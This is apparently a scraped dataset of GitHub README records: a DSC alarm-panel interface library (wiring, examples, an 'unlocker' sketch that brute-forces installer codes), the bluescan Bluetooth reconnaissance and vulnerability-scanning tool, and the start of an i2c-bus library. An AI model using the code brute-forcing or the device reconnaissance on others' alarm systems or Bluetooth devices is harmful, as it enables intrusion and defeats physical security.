uses ntp to automatically set the panel time\nnew: esphome integration example (located in the extras directory) - thanks to dilbert66 for this contribution!\nnew: tinygms-sms example sketch - sends status via sms with a gsm modem - thanks to jvitkauskas for this contribution!\nnew: keybusreaderip example sketch enables keybus data access over ip, thanks to aboulfad for this contribution!\nnew: esp32 microcontroller support - requires arduino-esp32 v1.0.5-rc6 or newer\nnew: features for sketches:\nready and disabled track partition status\nsettime() sets the panel date and time\npgmoutputs[] tracks the status of pgm outputs 1-14\ntimestampchanged tracks when the panel sends a timestamp\naccesscode tracks the access code used to arm/disarm\nresetstatus() triggers a full status update of all partitions and zones - for example, after initialization or a lost network connection.\npausestatus pauses status updates if set to true - for example, holding status changes during a lost network connection\nstop() disables the interface - for example, prior to starting ota updates\nappendpartition() in example sketches simplifies adding partition numbers to messages\npanelversion tracks the panel version number\nnew: handle *1 bypass/re-activate used to change stay/away mode while armed\nupdated: virtualkeypad-blynk and virtualkeypad-web display alarm memory, programming zone lights, and event buffer\nupdated: homeassistant-mqtt, homebridge-mqtt, openhab-mqtt include pgm outputs 1-14 status\nupdated: virtual keypad writes\nwrite() for multiple keys can now be set to block until the write is complete with an optional parameter if the char array is ephemeral\nchecking writeready is typically no longer needed in the sketch, the library will block if a previous write is in progress - this can be checked if the sketch needs to wait until the library can perform a nonblocking write\nupdated: homeassistant-mqtt sketch now includes night arm and for esp8266/esp32 includes a sensor with partition status messages\nupdated: expanded partition state processing to improve panel state detection at startup\ndeprecated: handlepanel() is now loop()\nbugfix: resolved keypad aux/panic key, ac power, and battery status on pc585/pc1555mx\nbugfix: resolved homebridge-mqtt sketch not handling homekit target states\nbugfix: resolved timing issues when consecutively calling write\n1.2\nnew: virtual keypad web interface example, thanks to elektrik1 for this contribution!\nas of esp8266 arduino core 2.5.1, you may need to manually update the esp8266fs plugin for spiffs upload.\nnew: support esp8266 cpu running at 160mhz - this helps sketches using tls through bearssl\nupdated: homeassistant-mqtt example includes availability status, thanks to bjrolfe for this contribution!\nupdated: list of tested dsc panels: pc585, pc1565, pc5005, pc1808\nupdated: esp8266 power wiring diagrams\nupdated: esp8266 module list\n1.1\nnew: zones 33-64 tamper and fault decoding\nnew: push notification example using twilio, thanks to colingng for this contribution!\nbugfix: zones 17-32 status incorrectly stored\n1.0\nnew: blynk virtual keypad example sketch and app layout examples\nnew: virtual keypad support for pgm terminals 1-4 command output\nnew: status keybusconnected to check if data is being received from the dsc panel\nnew: auxiliary input alarm decoding\n0.4\nnew: virtual keypad support for partitions 3-8, thanks to jvitkauskas for contributing the necessary logs\nnew: support atmega32u4-based arduino boards (switched to avr timer1)\nchanged: simplified example names, configurations, added version numbers\nbugfix: virtual keypad writes with partitions 5-8 enabled\nbugfix: f/a/p alarm key writes with processmoduledata disabled\nbugfix: homeassistant example configuration.yaml error for alarm_control_panel\n0.3\nnew: status for partitions 2-8, zones 33-64\nnew: virtual keypad support for partition 2\nnew: athom homey integration example sketch, thanks to magnusper for this contribution!\nnew: pcb layouts, contributed by sjlouw\nnew: configurable number of partitions and zones to customize memory usage: dscpartitions and dsczones in dsckeybusinterface.h\nnew: keybusreader decoding of commands 0xe6 and 0xeb\nchanged: split examples by platform\nchanged: arduino sketches no longer use pin 4 to avoid a conflict with the sd card on ethernet shields.\nchanged: mqtt examples updated with username and password fields\nchanged: processredundantdata now true by default to prevent storing repetitive data, reduces memory usage.\nnote: this release changes the library methods to accommodate multiple partitions, existing sketches will need to be updated to match the new example sketches.\n0.2\nnew: status for zones 9-32\nnew: home assistant integration example sketch\nnew: panel data buffering, adds dscbuffersize to dsckeybusinterface.h to allow configuration of how many panel commands are buffered to customize memory usage (uses 18 bytes of memory per command buffered).\n0.1 - initial release\nexamples\nthe included examples demonstrate how to use the library and can be used as-is or adapted to integrate with other software. post an issue/pull request if you've developed (and would like to share) a sketch/integration that others can use.\nstatus: processes and prints the security system status to a serial interface, including reading from serial for the virtual keypad. this demonstrates how to determine if the security system status has changed, what has changed, and how to take action based on those changes. post an issue/pull request if you have a use for additional system states - for now, only a subset of all decoded commands are being tracked for status to limit memory usage:\npartitions ready\npartitions armed away/stay/disarmed\npartitions in alarm\npartitions exit delay in progress\npartitions entry delay in progress\npartitions fire alarm\nzones open/closed\nzones in alarm\npgm outputs 1-14\nkeypad fire/auxiliary/panic alarm\nget/set panel date and time\nuser access code number (1-40)\npanel ac power\npanel battery\npanel trouble\nkeybus connected\nhomebridge-mqtt: interfaces with homebridge via mqtt to integrate with apple homekit (including the ios home app and siri) and google home. demonstrates arming/disarming partitions and for homekit, viewing the status of zones, pgm outputs, and fire alarms.\nthe dsckeybusinterface-rtos library includes a native homekit implementation that runs directly on esp8266, without requiring a separate device running mqtt or homebridge.\nhomeassistant-mqtt: interfaces with home assistant via mqtt. demonstrates arming/disarming partitions and viewing the status of zones, pgm outputs, fire alarms, and trouble. for esp8266/esp32, the partition status is available as a text message for display.\nopenhab-mqtt: interfaces with openhab via mqtt. demonstrates using the panel and partitions states as openhab switches and zone states as openhab contacts. for esp8266/esp32, a panel status message is also sent as a string to openhab. see https://github.com/jimtng/dscalarm-mqtt for an integration using the homie convention for openhab's homie mqtt component.\nesphome (esp8266): integrates with esphome as a custom component - note that this example is located in the extras directory. thanks to dilbert66 for this contribution!\nhomey: integrates with athom homey and the homeyduino library, including armed, alarm, and fire states (currently limited to one partition), and zone states. thanks to magnusper for contributing this example!\ntelegram (esp8266/esp32): demonstrates sending status updates and arming/disarming the security system via a telegram bot.\npushbullet (esp8266/esp32): demonstrates sending status updates as a push notification via pushbullet.\ntwilio-sms (esp8266/esp32): demonstrates sending status updates as an sms text message via twilio - thanks to colingng for contributing this example!\nemail (esp8266/esp32): demonstrates sending status updates as an email. email is sent using smtps (port 465) with ssl for encryption - this is necessary on the esp8266/esp32 until starttls can be supported. for example, this will work with gmail after changing the account settings to allow less secure apps.\nthis can be used to send sms text messages if the number's service provider has an email to sms gateway - examples for the us:\nt-mobile: 5558675309@tmomail.net\nverizon: 5558675309@vtext.com\nsprint: 5558675309@messaging.sprintpcs.com\nat&t: 5558675309@txt.att.net\nvirtualkeypad-blynk (esp8266/esp32): provides a virtual keypad interface for the free blynk app on ios and android, including viewing alarm memory, programming zone lights, and the event buffer. scan one of the following qr codes from within the blynk app for an example keypad layout:\nvirtual keypad with 16 zones\nvirtual keypad with 32 zones\nvirtual keypad with 8 zones and event log\nnote: installing blynk as a local server is recommended to keep control of the security system internal to your network. this also lets you use as many widgets as needed for free - local servers can setup users with any amount of blynk energy. using the default blynk cloud service with the above example layouts requires more of blynk's energy units than available on the free usage tier.\nvirtualkeypad-web (esp8266/esp32): provides a virtual keypad web interface, using the esp8266/esp32 itself as a standalone web server, including viewing alarm memory, programming zone lights, and the event buffer. thanks to elektrik1 for contributing this example!\ntimesyncntp: synchronizes and maintains the panel time via an ntp server, including dst adjustments.\nunlocker: checks all possible 4-digit installer codes until a valid code is found, including handling keypad lockout if enabled. the valid code is output to serial as well as repeatedly flashed with the built-in led.\nkeybusreader: decodes and prints data from the keybus to a serial interface, including reading from serial for the virtual keypad. this can be used to help decode the keybus protocol and is also handy as a troubleshooting -----> tool !!!  to verify that data is displayed without errors. for esp8266/esp32, keybusreaderip enables connectivity over wifi.\nsee src/dsckeybusprintdata.cpp for all currently known keybus protocol commands and messages. issues and pull requests with additions/corrections are welcome!\nmore dsc projects\ndscalarm-mqtt: implementation of the homie mqtt convention\nesphome-dsckeybus: implementation of this library as an esphome custom component\npc1500keybusreader: mqtt homekit example for the pc1500 and esp32 using dougkpowers/pc1550-interface\nwiring\ndsc aux(+) ---+--- arduino vin pin\n|\n+--- 5v voltage regulator --- esp8266 nodemcu / wemos d1 mini 5v pin\nesp32 development board 5v pin\ndsc aux(-) --- arduino/esp8266/esp32 ground\narduino +--- dscclockpin (arduino uno: 2,3)\ndsc yellow ---+--- 15k ohm resistor ---|\n| +--- 10k ohm resistor --- ground\n|\n| esp8266/esp32 +--- dscclockpin (esp8266: d1,d2,d8 / esp32: 4,13,16-39)\n+--- 33k ohm resistor ---|\n+--- 10k ohm resistor --- ground\narduino +--- dscreadpin (arduino uno: 2-12)\ndsc green ----+--- 15k ohm resistor ---|\n| +--- 10k ohm resistor --- ground\n|\n| esp8266/esp32 +--- dscreadpin (esp8266: d1,d2,d8 / esp32: 4,13,16-39)\n+--- 33k ohm resistor ---|\n+--- 10k ohm resistor --- ground\nvirtual keypad (optional):\ndsc green ---- npn collector --\\\n|-- npn base --- 1k ohm resistor --- dscwritepin (arduino uno: 2-12 / esp8266: d1,d2,d8 / esp32: 4,13,16-33)\nground --- npn emitter --/\nthe dsc keybus operates at ~12.6v, a pair of resistors per data line will bring this down to an appropriate voltage for each microcontroller.\narduino:\nthe dsc yellow (clock) line connects to a hardware interrupt pin - for the uno, these are pins 2 or 3. the example sketches use dscclockpin: 3.\nthe dsc green (data) line can be connected to any of the remaining digital pins 2-12. the examples sketches use dscreadpin: 5 and dscwritepin: 6.\nesp8266: connect the dsc lines to gpio pins that are normally low to avoid putting spurious data on the keybus: d1 (gpio5), d2 (gpio4) and d8 (gpio15). the example sketches use dscclockpin: d1, dscreadpin: d2, dscwritepin: d8.\nesp32: connect the dsc lines to gpio pins that do not send signals at boot: 4, 13, 16-39. for virtual keypad, use pins 4, 13, 16-33 - pins 34-39 are input only and cannot be used. the example sketches use dscclockpin: 18, dscreadpin: 19, dscwritepin: 21.\nvirtual keypad uses an npn transistor and a resistor to write to the keybus. most small signal npn transistors should be suitable, for example:\n2n3904\nbc547, bc548, bc549\nthat random npn at the bottom of your parts bin (my choice)\npower:\narduino boards can be powered directly from the dsc panel\nesp8266/esp32 development boards should use an external voltage regulator set to 5v to the 5v pin:\nlm2596-based step-down buck converter modules are reasonably efficient and commonly available for under $1usd shipped (ebay, aliexpress, etc) - these are the modules i use.\nmp2307-based step-down buck converter modules (aka mini360) are also available but some versions run hot with an efficiency nearly as poor as linear regulators.\nlinear voltage regulators (lm7805, etc) will work but are inefficient and run hot - these may need a heatsink.\nesp8266/esp32 boards can also use an external voltage regulator set to 3.3v to the 3.3v pin - this bypasses the module's onboard voltage regulator. for example, some wemos d1 mini clones use low current voltage regulators that can cause stability issues. nodemcu boards are not affected as they use the more powerful ams1117 regulator.\nconnections should be soldered, breadboards can cause issues.\nvirtual keypad\nthis allows a sketch to send keys to the dsc panel to emulate the physical dsc keypads and enables full control of the panel from the sketch or other software.\nkeys are sent to partition 1 by default and can be changed to a different partition. the following keys can be sent to the panel - see the examples for usage:\nkeypad: 0-9 * #\narm stay (requires access code if quick arm is disabled): s\narm away (requires access code if quick arm is disabled): w\narm with no entry delay (requires access code): n\nfire alarm: f\nauxiliary alarm: a\npanic alarm: p\ndoor chime enable/disable: c\nfire reset: r\nquick exit: x\nchange partition: / + partition number or set writepartition to the partition number. examples:\nswitch to partition 2 and send keys: /2 + 1234\nswitch back to partition 1: /1\nset directly in sketch: dsc.writepartition = 8;\ncommand output 1: [\ncommand output 2: ]\ncommand output 3: {\ncommand output 4: }\ndsc configuration\npanel options affecting this interface, configured by *8 + installer code - see the unlocker sketch if your panel's installer code is unknown. refer to the dsc installation manual for your panel to configure these options:\npc1555mx/5015 section 370, pc1616/pc1832/pc1864 section 377:\nswinger shutdown: by default, the panel will limit the number of alarm commands sent in a single armed cycle to 3 - for example, a zone alarm being triggered multiple times will stop reporting after 3 alerts. this is to avoid sending alerts repeatedly to a third-party monitoring service, and also affects this interface. as i do not use a monitoring service, i disable swinger shutdown by setting this to 000.\nac power failure reporting delay: the default delay is 30 minutes and can be set to 000 to immediately report a power failure.\nnotes\nfor ota updates on esp8266 and esp32, you may need to stop the interface using dsc.stop();:\nvoid setup() {\n...\narduinoota.onstart([]() {\ndsc.stop();\n...\nmemory usage can be adjusted based on the number of partitions, zones, and data buffer size specified in src/dsckeybusinterface.h. default settings:\narduino: up to 4 partitions, 32 zones, 10 buffered commands\nesp8266/esp32: up to 8 partitions, 64 zones, 50 buffered commands\npcb layouts are available in extras/pcb layouts - thanks to sjlouw for contributing these designs!\nsupport for other platforms depends on adjusting the code to use their platform-specific timers. in addition to hardware interrupts to capture the dsc clock, this library uses platform-specific timer interrupts to capture the dsc data line in a non-blocking way 250\u03bcs after the clock changes (without using delaymicroseconds()). this is necessary because the clock and data are asynchronous - i've observed keypad data delayed up to 160\u03bcs after the clock falls.\ntroubleshooting\nif you are running into issues:\nrun the keybusreader example sketch and view the serial output to verify that the interface is capturing data successfully without reporting crc errors.\nif data is not showing up or has errors, check the clock and data line wiring, resistors, and all connections. breadboards can cause issues, connections should be soldered instead.\nfor virtual keypad, run the keybusreader example sketch and enter keys through serial and verify that the keys appear in the output and that the panel responds.\nif keys are not displayed in the output, verify the transistor pinout, base resistor, and wiring connections.\nrun the status example sketch and view the serial output to verify that the interface displays events from the security system correctly as partitions are armed, zones opened, etc.\nreferences\navr freaks - dsc keybus protocol: an excellent discussion on how data is sent on the keybus.\nstagf15/dsc_panel: a library that nearly works for the pc1555mx but had timing and data errors. writing this library from scratch was primarily a programming exercise, otherwise it should be possible to patch the dsc_panel library.\ndougkpowers/pc1550-interface: an interface for the dsc classic series.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000272, "year": null}, {"Unnamed: 0": 277, "autor": 277, "date": null, "content": "bluescan ---- A powerful Bluetooth scanner\nEnglish \u00b7 \u7b80\u4f53\u4e2d\u6587\nThis project is maintained by Sourcell Xu from DBAPP Security HatLab.\nBluetooth is a complex protocol, and a good scanner can quickly help us peek inside its secrets. But previous Bluetooth scanners suffered from a number of problems such as incomplete functionality, unintuitive information and out of repair. So we came up with this powerful Bluetooth scanner based on modern Python 3 ---- bluescan.\nWhen hacking Bluetooth targets, bluescan can be very useful for intelligence collecting. It can collect the following information:\nBR devices\nLE devices\nBR LMP features\nLE LL features\nSMP Pairing features\nReal-time advertising physical channel PDU\nSDP services\nGATT services\nVulnerabilities (demo)\nRequirements\nbluescan is based on BlueZ, the official Linux Bluetooth stack. It only supports running on Linux, and the following packages need to be installed:\nsudo apt install python3-pip \\\nlibcairo2-dev `# To solve the installation error \"Failed to build pycairo\" ` \\\npython3-dev `# To solve the installation error \"Python.h: No such file or directory\"` \\\nlibgirepository1.0-dev `# To solve the installation error \"Failed building wheel for PyGObject\"` \\\nlibbluetooth-dev `# To solve the installation error \"bluetooth/bluetooth.h: No such file or directory\"` \\\nbluez-tools\nIf you still encounter errors when installing bluescan, please try to install the following packages to solve:\nsudo apt install \\\nlibglib2.0-dev libdbus-1-dev gir1.2-gtk-3.0 \\\npython3-dbus python3-gi python3-gi-cairo\nMore importantly, bluescan requires at least Python 3.9 support. If the system default Python version is lower than 3.9, then you need to do some extra operations. For example, in Ubuntu 20.04.2 LTS (Focal Fossa), the system uses Python 3.8 by default, and the extra operations are as follows:\nsudo apt install python3.9 python3.9-dev\n# To solve the runtime error \"No module named '_dbus_bindings'\"\ncd /usr/lib/python3/dist-packages\nsudo cp _dbus_bindings.cpython-38-x86_64-linux-gnu.so \\\n_dbus_bindings.cpython-39-x86_64-linux-gnu.so\nsudo cp _dbus_glib_bindings.cpython-38-x86_64-linux-gnu.so \\\n_dbus_glib_bindings.cpython-39-x86_64-linux-gnu.so\nWhen you play this tool in a Linux virtual machine, making a USB Bluetooth adapter exclusive to it is recommended, like the Ostran Bluetooth USB Adapter OST-105 CSR 8150 v4.0 for 99 RMB\uff1a\nParani UD100-G03 is better than the above-mentioned Ostran adapter. But of course it will be a little more expensive, 560 RMB\uff1a\nAnd if you want to try the vulnerability scanning, see README.md of ojasookert/CVE-2017-0785 to resolve dependencies.\nDedicated firmware for micro:bit\nIf you want to use bluescan to sniff the advertising physical channel PDU (-m le --adv), you need to execute the following command to download the dedicated firmware bin/bluescan-advsniff-combined.hex to 1 or 3 micro:bit(s). It is recommended to use 3 micro:bits at the same time.\ncd bluescan\ncp bin/bluescan-advsniff-combined.hex /media/${USER}/MICROBIT\ncp bin/bluescan-advsniff-combined.hex /media/${USER}/MICROBIT1\ncp bin/bluescan-advsniff-combined.hex /media/${USER}/MICROBIT2\nIf you want to compile the firmware yourself, first install the following packages:\nsudo apt install yotta ninja-build\nThen execute the following command, it will automatically compile (requires network to automatically resolve dependencies) and download the firmware to the micro:bit(s) which connected to your PC:\ncd bluescan\nmake flash\nInstall\nPlease read the \"Requirements\" section first to avoid installation and runtime errors.\nThe lastest bluescan will be uploaded to PyPI, so the following command can install bluescan:\nsudo pip3 install bluescan\nIf you do not use the system default Python, but install Python 3.9 yourself, then you need to install bluescan like this:\nsudo python3.9 -m pip install bluescan\nUsage\n$ bluescan -h\nbluescan\nA powerful Bluetooth scanner.\nAuthor: Sourcell Xu from DBAPP Security HatLab.\nLicense: GPL-3.0\nUsage:\nbluescan (-h | --help)\nbluescan (-v | --version)\nbluescan [-i <hci>] --clean BD_ADDR\nbluescan [-i <hci>] -m br [--inquiry-len=<n>]\nbluescan [-i <hci>] -m br --lmp-feature BD_ADDR\nbluescan [-i <hci>] -m le [--scan-type=<type>] [--timeout=<sec>] [--sort=<key>]\nbluescan [-i <hci>] -m le [--ll-feature|--smp-feature] [--timeout=<sec>] --addr-type=<type> BD_ADDR\nbluescan -m le --adv [--channel=<num>]\nbluescan [-i <hci>] -m sdp BD_ADDR\nbluescan [-i <hci>] -m gatt [--include-descriptor] [--io-capability=<name>] --addr-type=<type> BD_ADDR\nbluescan [-i <hci>] -m vuln [--addr-type=<type>] BD_ADDR\nArguments:\nBD_ADDR Target Bluetooth device address. FF:FF:FF:00:00:00 means local\ndevice.\nOptions:\n-h, --help Display this help.\n-v, --version Show the version.\n-i <hci> HCI device used for subsequent scans. [default: The first HCI device]\n-m <mode> Scan mode, support BR, LE, SDP, GATT and vuln.\n--inquiry-len=<n> Inquiry_Length parameter of HCI_Inquiry command. [default: 8]\n--lmp-feature Scan LMP features of the remote BR/EDR device.\n--scan-type=<type> Scan type used for scanning LE devices, active or\npassive. [default: active]\n--timeout=<sec> Duration of the LE scanning, but may not be precise. [default: 10]\n--sort=<key> Sort the discovered devices by key, only support\nRSSI now. [default: rssi]\n--adv Sniff advertising physical channel PDU. Need at\nleast one micro:bit.\n--ll-feature Scan LL features of the remote LE device.\n--smp-feature Detect pairing features of the remote LE device.\n--channel=<num> LE advertising physical channel, 37, 38 or 39). [default: 37,38,39]\n--include-descriptor Fetch descriptor information.\n--addr-type=<type> Type of the LE address, public or random.\n--io-capability=<name> Set IO capability of the agent. Available value: DisplayOnly, DisplayYesNo,\nKeyboardOnly, NoInputNoOutput, KeyboardDisplay (KeyboardOnly) [default: NoInputNoOutput]\n--clean Clean the cached data of a remote device.\nScan BR devices -m br\nClassic Bluetooth devices may use three technologies: BR (Basic Rate), EDR (Enhanced Data Rate), and AMP (Alternate MAC/PHY). Since they all belong to the Basic Rate system, so when scanning these devices we call them BR device scanning:\nAs shown above, through BR device scanning, we can get the address, page scan repetition mode, class of device, clock offset, RSSI, and the extended inquiry response (Name, TX power, and so on) of the surrounding classic Bluetooth devices.\nScan LE devices -m le\nBluetooth technology, in addition to the Basic Rate system, is Low Energy (LE) system. When scanning Bluetooth low energy devices, it is called LE device scanning:\nAs shown above, through LE device scanning, we can get the address, address type, connection status, RSSI, and GAP data of the surrounding LE devices.\nScan BR LMP features -m br --lmp-feature\nDetecting the LMP features of classic Bluetooth devices allows us to judge the underlying security features of them:\nScan LE LL features -m le --ll-feature\nDetecting the LL (Link Layer) features fo the LE devices:\nDetect SMP Pairing features -m le --smp-feature\nDetecting the SMP Pairing features of the remote LE device:\nSniffing advertising physical channel PDU -m le --adv\nCompared with scanning adove the HCI, using micro:bit to sniff the advertising physical channel PDU at the link layer, you can get richer LE device activity information:\n\ud83d\udca1 The scan mode has a hidden function.\nScan SDP services -m sdp\nClassic Bluetooth devices tell the outside world about their open services through SDP. After SDP scanning, we can get service records of them:\nYou can try to connect to these services for further hacking.\nScan GATT services -m gatt\nLE devices tell the outside world about their open services through GATT. After GATT scanning, we can get the GATT service of them. You can try to read and write these GATT data for further hacking:\nVulnerabilities scanning -m vuln (demo)\nVulnerability scanning is still in the demo stage, and currently only supports CVE-2017-0785:\n$ sudo bluescan -m vuln --addr-type=br ??:??:??:??:??:??\n... ...\nCVE-2017-0785\nFAQ\nException: \"Can't find the ID of hci0 in rfkill\"\nSome old versions of rfkill do not support -r and -n options, like:\n# Ubuntu 16.04.1\nrfkill --version\n# rfkill 0.5-1ubuntu3 (Ubuntu)\"\nPlease upgrade rfkill or OS to solve this problem.\nPS: My system is Kali, and the version of rfkill is:\n# Kali\nrfkill --version\n# rfkill from util-linux 2.36.1\nIf you encounter the following error, restart bluetooth service to recover (sudo systemctl restart bluetooth.service):\n[ERROR] Failed to execute management command 'scanend' (code: 11, error: Rejected)", "link": "https://github.com/fO-000/bluescan", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "bluescan ---- a powerful bluetooth scanner\nenglish \u00b7 \u7b80\u4f53\u4e2d\u6587\nthis project is maintained by sourcell xu from dbapp security hatlab.\nbluetooth is a complex protocol, and a good scanner can quickly help us peek inside its secrets. but previous bluetooth scanners suffered from a number of problems such as incomplete functionality, unintuitive information and out of repair. so we came up with this powerful bluetooth scanner based on modern python 3 ---- bluescan.\nwhen hacking bluetooth targets, bluescan can be very useful for intelligence collecting. it can collect the following information:\nbr devices\nle devices\nbr lmp features\nle ll features\nsmp pairing features\nreal-time advertising physical channel pdu\nsdp services\ngatt services\nvulnerabilities (demo)\nrequirements\nbluescan is based on bluez, the official linux bluetooth stack. it only supports running on linux, and the following packages need to be installed:\nsudo apt install python3-pip \\\nlibcairo2-dev `# to solve the installation error \"failed to build pycairo\" ` \\\npython3-dev `# to solve the installation error \"python.h: no such file or directory\"` \\\nlibgirepository1.0-dev `# to solve the installation error \"failed building wheel for pygobject\"` \\\nlibbluetooth-dev `# to solve the installation error \"bluetooth/bluetooth.h: no such file or directory\"` \\\nbluez-tools\nif you still encounter errors when installing bluescan, please try to install the following packages to solve:\nsudo apt install \\\nlibglib2.0-dev libdbus-1-dev gir1.2-gtk-3.0 \\\npython3-dbus python3-gi python3-gi-cairo\nmore importantly, bluescan requires at least python 3.9 support. if the system default python version is lower than 3.9, then you need to do some extra operations. for example, in ubuntu 20.04.2 lts (focal fossa), the system uses python 3.8 by default, and the extra operations are as follows:\nsudo apt install python3.9 python3.9-dev\n# to solve the runtime error \"no module named '_dbus_bindings'\"\ncd /usr/lib/python3/dist-packages\nsudo cp _dbus_bindings.cpython-38-x86_64-linux-gnu.so \\\n_dbus_bindings.cpython-39-x86_64-linux-gnu.so\nsudo cp _dbus_glib_bindings.cpython-38-x86_64-linux-gnu.so \\\n_dbus_glib_bindings.cpython-39-x86_64-linux-gnu.so\nwhen you play this -----> tool !!!  in a linux virtual machine, making a usb bluetooth adapter exclusive to it is recommended, like the ostran bluetooth usb adapter ost-105 csr 8150 v4.0 for 99 rmb\uff1a\nparani ud100-g03 is better than the above-mentioned ostran adapter. but of course it will be a little more expensive, 560 rmb\uff1a\nand if you want to try the vulnerability scanning, see readme.md of ojasookert/cve-2017-0785 to resolve dependencies.\ndedicated firmware for micro:bit\nif you want to use bluescan to sniff the advertising physical channel pdu (-m le --adv), you need to execute the following command to download the dedicated firmware bin/bluescan-advsniff-combined.hex to 1 or 3 micro:bit(s). it is recommended to use 3 micro:bits at the same time.\ncd bluescan\ncp bin/bluescan-advsniff-combined.hex /media/${user}/microbit\ncp bin/bluescan-advsniff-combined.hex /media/${user}/microbit1\ncp bin/bluescan-advsniff-combined.hex /media/${user}/microbit2\nif you want to compile the firmware yourself, first install the following packages:\nsudo apt install yotta ninja-build\nthen execute the following command, it will automatically compile (requires network to automatically resolve dependencies) and download the firmware to the micro:bit(s) which connected to your pc:\ncd bluescan\nmake flash\ninstall\nplease read the \"requirements\" section first to avoid installation and runtime errors.\nthe lastest bluescan will be uploaded to pypi, so the following command can install bluescan:\nsudo pip3 install bluescan\nif you do not use the system default python, but install python 3.9 yourself, then you need to install bluescan like this:\nsudo python3.9 -m pip install bluescan\nusage\n$ bluescan -h\nbluescan\na powerful bluetooth scanner.\nauthor: sourcell xu from dbapp security hatlab.\nlicense: gpl-3.0\nusage:\nbluescan (-h | --help)\nbluescan (-v | --version)\nbluescan [-i <hci>] --clean bd_addr\nbluescan [-i <hci>] -m br [--inquiry-len=<n>]\nbluescan [-i <hci>] -m br --lmp-feature bd_addr\nbluescan [-i <hci>] -m le [--scan-type=<type>] [--timeout=<sec>] [--sort=<key>]\nbluescan [-i <hci>] -m le [--ll-feature|--smp-feature] [--timeout=<sec>] --addr-type=<type> bd_addr\nbluescan -m le --adv [--channel=<num>]\nbluescan [-i <hci>] -m sdp bd_addr\nbluescan [-i <hci>] -m gatt [--include-descriptor] [--io-capability=<name>] --addr-type=<type> bd_addr\nbluescan [-i <hci>] -m vuln [--addr-type=<type>] bd_addr\narguments:\nbd_addr target bluetooth device address. ff:ff:ff:00:00:00 means local\ndevice.\noptions:\n-h, --help display this help.\n-v, --version show the version.\n-i <hci> hci device used for subsequent scans. [default: the first hci device]\n-m <mode> scan mode, support br, le, sdp, gatt and vuln.\n--inquiry-len=<n> inquiry_length parameter of hci_inquiry command. [default: 8]\n--lmp-feature scan lmp features of the remote br/edr device.\n--scan-type=<type> scan type used for scanning le devices, active or\npassive. [default: active]\n--timeout=<sec> duration of the le scanning, but may not be precise. [default: 10]\n--sort=<key> sort the discovered devices by key, only support\nrssi now. [default: rssi]\n--adv sniff advertising physical channel pdu. need at\nleast one micro:bit.\n--ll-feature scan ll features of the remote le device.\n--smp-feature detect pairing features of the remote le device.\n--channel=<num> le advertising physical channel, 37, 38 or 39). [default: 37,38,39]\n--include-descriptor fetch descriptor information.\n--addr-type=<type> type of the le address, public or random.\n--io-capability=<name> set io capability of the agent. available value: displayonly, displayyesno,\nkeyboardonly, noinputnooutput, keyboarddisplay (keyboardonly) [default: noinputnooutput]\n--clean clean the cached data of a remote device.\nscan br devices -m br\nclassic bluetooth devices may use three technologies: br (basic rate), edr (enhanced data rate), and amp (alternate mac/phy). since they all belong to the basic rate system, so when scanning these devices we call them br device scanning:\nas shown above, through br device scanning, we can get the address, page scan repetition mode, class of device, clock offset, rssi, and the extended inquiry response (name, tx power, and so on) of the surrounding classic bluetooth devices.\nscan le devices -m le\nbluetooth technology, in addition to the basic rate system, is low energy (le) system. when scanning bluetooth low energy devices, it is called le device scanning:\nas shown above, through le device scanning, we can get the address, address type, connection status, rssi, and gap data of the surrounding le devices.\nscan br lmp features -m br --lmp-feature\ndetecting the lmp features of classic bluetooth devices allows us to judge the underlying security features of them:\nscan le ll features -m le --ll-feature\ndetecting the ll (link layer) features fo the le devices:\ndetect smp pairing features -m le --smp-feature\ndetecting the smp pairing features of the remote le device:\nsniffing advertising physical channel pdu -m le --adv\ncompared with scanning adove the hci, using micro:bit to sniff the advertising physical channel pdu at the link layer, you can get richer le device activity information:\n\ud83d\udca1 the scan mode has a hidden function.\nscan sdp services -m sdp\nclassic bluetooth devices tell the outside world about their open services through sdp. after sdp scanning, we can get service records of them:\nyou can try to connect to these services for further hacking.\nscan gatt services -m gatt\nle devices tell the outside world about their open services through gatt. after gatt scanning, we can get the gatt service of them. you can try to read and write these gatt data for further hacking:\nvulnerabilities scanning -m vuln (demo)\nvulnerability scanning is still in the demo stage, and currently only supports cve-2017-0785:\n$ sudo bluescan -m vuln --addr-type=br ??:??:??:??:??:??\n... ...\ncve-2017-0785\nfaq\nexception: \"can't find the id of hci0 in rfkill\"\nsome old versions of rfkill do not support -r and -n options, like:\n# ubuntu 16.04.1\nrfkill --version\n# rfkill 0.5-1ubuntu3 (ubuntu)\"\nplease upgrade rfkill or os to solve this problem.\nps: my system is kali, and the version of rfkill is:\n# kali\nrfkill --version\n# rfkill from util-linux 2.36.1\nif you encounter the following error, restart bluetooth service to recover (sudo systemctl restart bluetooth.service):\n[error] failed to execute management command 'scanend' (code: 11, error: rejected)", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000277, "year": null}, {"Unnamed: 0": 278, "autor": 278, "date": null, "content": "i2c-bus\nI2C serial bus access with Node.js on Linux boards like the Raspberry Pi or BeagleBone. The i2c-bus API supports promises and async/await, asynchronous callbacks and synchronous execution.\ni2c-bus supports Node.js versions 10, 12, 14, 15 and 16.\nContents\nInstallation\nUsage\nAPI\nTypeScript Type Definitions\nInstallation\nnpm install i2c-bus\nThe way in which I2C is configured varies from board to board. Sometimes no configuraton is required, but sometimes it is:\nConfiguring I2C on the Raspberry Pi\nConfiguring Software I2C on the Raspberry Pi\nConsider software I2C when there are issues communicating with a device on a Raspberry Pi\nUsage\nThe example programs below show how to use a MCP9808 I2C temperature sensor to determine the temperature.\nMCP9808 I2C temperature sensor connected to a Raspberry Pi\nExample 1 - Promises\nDetermine the temperature with a MCP9808 I2C temperature sensor using promises.\nconst i2c = require('i2c-bus');\nconst MCP9808_ADDR = 0x18;\nconst TEMP_REG = 0x05;\nconst toCelsius = rawData => {\nrawData = (rawData >> 8) + ((rawData & 0xff) << 8);\nlet celsius = (rawData & 0x0fff) / 16;\nif (rawData & 0x1000) {\ncelsius -= 256;\n}\nreturn celsius;\n};\ni2c.openPromisified(1).\nthen(i2c1 => i2c1.readWord(MCP9808_ADDR, TEMP_REG).\nthen(rawData => console.log(toCelsius(rawData))).\nthen(_ => i2c1.close())\n).catch(console.log);\nExample 2 - Promises, Plain I2C and Buffers\nDetermine the temperature with a MCP9808 I2C temperature sensor using promises, plain I2C and Buffer objects.\nconst i2c = require('i2c-bus');\nconst MCP9808_ADDR = 